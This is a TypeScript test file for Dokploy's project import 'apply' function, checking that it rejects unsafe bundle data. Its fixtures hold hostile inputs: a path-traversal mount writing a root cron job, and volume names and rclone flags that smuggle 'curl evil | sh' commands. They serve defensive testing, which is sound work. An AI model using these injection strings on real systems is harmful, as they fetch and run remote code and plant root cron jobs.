import type {
	Plan,
	Snapshot,
	TransferWriteDb,
} from "@dokploy/server/services/project-export-import";
import { apply } from "@dokploy/server/services/project-export-import";
import { describe, expect, it } from "vitest";

const manifest: Snapshot["manifest"] = {
	format: "dokploy-project-export",
	formatVersion: 1,
	exportedAt: "2024-01-01T00:00:00.000Z",
	exportedBy: { userId: "user-1", email: "a@b.com" },
	sourceInstance: { dokployVersion: "1.0.0", organizationId: "org-src" },
	scope: {
		includeEnvSecrets: true,
		shared: {},
		files: {
			applicationSources: true,
			composeFiles: true,
			traefikRaw: true,
			customCertificates: true,
		},
		dumps: { mode: "none" },
		includeBackupSchedules: true,
	},
	crypto: {
		salt: "c2FsdA==",
		kdfParams: { N: 32768, r: 8, p: 1, dkLen: 64 },
		keyCheck: "{}",
	},
	counts: {},
};

const plan = (overrides: Partial<Plan> = {}): Plan => ({
	target: { kind: "newProject", name: "p" },
	resolutions: {},
	serverMap: { null: null },
	appNameMap: { "web-abc123": "web-xyz789" },
	domainStrategy: { custom: "keep" },
	portsStrategy: "keep",
	rotateDatabaseCredentials: false,
	conflicts: [],
	pendingServices: [],
	warnings: [],
	validation: [],
	summary: { counts: {}, domains: 0, dumps: 0 },
	...overrides,
});

const writeDb = () =>
	({
		query: {
			server: { findFirst: async () => undefined },
			webServerSettings: { findFirst: async () => undefined },
			mounts: { findMany: async () => [] },
			github: { findFirst: async () => undefined },
			gitlab: { findFirst: async () => undefined },
			gitea: { findFirst: async () => undefined },
			bitbucket: { findFirst: async () => undefined },
		},
		insert: () => ({
			values: (values: Record<string, unknown>) => ({
				returning: async () => [
					{
						...values,
						projectId: "project-new",
						environmentId: "env-new",
						applicationId: "app-new",
						destinationId: "dest-new",
					},
				],
			}),
		}),
		update: () => ({ set: () => ({ where: async () => {} }) }),
		transaction: async (fn: (tx: unknown) => Promise<unknown>) => fn(writeDb()),
	}) as unknown as TransferWriteDb;

const appWith = (mount: Record<string, unknown>): Snapshot => ({
	manifest,
	resources: {
		project: { projectId: "project-src", name: "p", env: "" },
		environments: [{ environmentId: "env-1", name: "production", env: "" }],
		services: [
			{
				kind: "application",
				applicationId: "app-1",
				appName: "web-abc123",
				environmentId: "env-1",
				mounts: [mount],
			},
		],
		shared: {},
	},
	requirements: [],
	warnings: [],
	dumps: [],
});

describe("apply rejects unsafe bundle rows", () => {
	it("refuses a file mount whose filePath escapes the service directory", async () => {
		const snapshot = appWith({
			mountId: "m-1",
			type: "file",
			filePath: "../../../etc/cron.d/x",
			content: "* * * * * root id",
			mountPath: "/x",
		});
		await expect(
			apply(writeDb(), snapshot, plan(), new Map(), "org-dest"),
		).rejects.toThrow(/Unsafe mount filePath/);
	});

	it("refuses a volume mount with a shell-unsafe volume name", async () => {
		const snapshot = appWith({
			mountId: "m-1",
			type: "volume",
			volumeName: "x:/v; curl evil | sh; #",
			mountPath: "/data",
		});
		await expect(
			apply(writeDb(), snapshot, plan(), new Map(), "org-dest"),
		).rejects.toThrow(/Invalid volume name/);
	});

	it("refuses a destination whose additional rclone flags don't match the API rule", async () => {
		const snapshot: Snapshot = {
			manifest,
			resources: {
				project: { projectId: "project-src", name: "p", env: "" },
				environments: [],
				services: [],
				shared: {
					destination: [
						{
							destinationId: "dest-src",
							name: "backups",
							bucket: "b",
							endpoint: "e",
							region: "r",
							accessKey: "$secret:a",
							secretAccessKey: "$secret:b",
							additionalFlags: ["; curl http://evil | sh #"],
						},
					],
				},
			},
			requirements: [
				{
					kind: "destination",
					originalId: "dest-src",
					configIncluded: true,
					usedBy: [],
					bucket: "b",
					endpoint: "e",
					region: "r",
				},
			],
			warnings: [],
			dumps: [],
		};
		await expect(
			apply(
				writeDb(),
				snapshot,
				plan({
					resolutions: {
						"destination:dest-src": {
							requirementKey: "destination:dest-src",
							action: "create",
						},
					},
				}),
				new Map([
					["a", "ak"],
					["b", "sk"],
				]),
				"org-dest",
			),
		).rejects.toThrow(/invalid additional rclone flags/);
	});
});
